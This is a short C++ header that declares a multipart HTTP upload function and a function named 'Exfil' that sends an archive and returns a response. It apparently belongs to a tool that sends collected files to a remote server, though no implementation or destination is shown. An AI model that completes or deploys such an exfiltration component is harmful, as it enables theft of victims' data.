#pragma once
#include "common.h"

bool HttpPostMultipart(const std::wstring& url, const fs::path& file, const std::string& caption,
                       const std::string& fieldFile, const std::map<std::string, std::string>& fields,
                       std::string* response);
bool Exfil(const fs::path& archive, std::string* response);
